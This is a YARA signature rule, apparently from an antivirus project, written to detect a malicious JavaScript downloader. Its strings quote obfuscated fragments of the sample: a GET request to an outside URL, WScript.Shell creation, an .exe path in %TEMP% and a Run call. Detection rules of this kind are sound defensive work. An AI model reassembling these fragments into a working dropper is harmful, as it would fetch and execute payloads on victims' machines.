rule sig_20160401_b8481c9b2a4e5134860d1c72712c38d3 {
  meta:
    description = "datamaliciousorder - file 20160401_b8481c9b2a4e5134860d1c72712c38d3.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f073d8713f299d31ae9563242a8f35faedb4cce8f33b0baeed7bced2a046d74b"

  strings:
    $s1  = "ZbgIqc[VmzNv](\"G\" + \"ET\", \"http://be-stlines-tore.com/j38sf\", false);" fullword ascii
    $s2  = "var YdwKf = function HrmEl() {return WScript[IfXw](\"WScript\"+\".Shell\");}(), SxXpq = 11;" fullword ascii
    $s3  = "function XhnUeh(EzzPua, LzrRf){UjdZbk = UjdZbk * 1; return EzzPua - LzrRf;};" fullword ascii
    $s4  = "if (ZbgIqc[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function DvZhn(){return IzUcf + \"\";};" fullword ascii
    $s6  = "function FjCe() {return YdwKf[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"pUX6q0wvAuKy.ex\" + \"e\";};" fullword ascii
    $s7  = "var XzgNg = new this[\"Date\"]();" fullword ascii
    $s8  = "function ShMg()" fullword ascii
    $s9  = "}while (WvmSzq);" fullword ascii
    $s10 = "return XhnUeh(DurTy, FxkHna);" fullword ascii
    $s11 = "function GmMgf(SoFke){YdwKf[\"R\"+\"un\"](SoFke, UjdZbk, UjdZbk);};" fullword ascii
    $s12 = "RqTnt = true; " fullword ascii
    $s13 = "function IbJrb(TzOte) {var QdnBj = (1, 2, 3, 4, 5, TzOte); return QdnBj;};" fullword ascii
    $s14 = "function BcnSi(){return 23;};" fullword ascii
    $s15 = "function AroFue(){return IfXw;};" fullword ascii
    $s16 = "var RqTnt = false;" fullword ascii
    $s17 = "var UmmOkk = false;" fullword ascii
    $s18 = "function JpRzs() {return ((RqTnt == true) && (RqTnt == VxVca)) ? 1 : UjdZbk;};" fullword ascii
    $s19 = "var VxVca = false;" fullword ascii
    $s20 = "} catch(MjVy){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}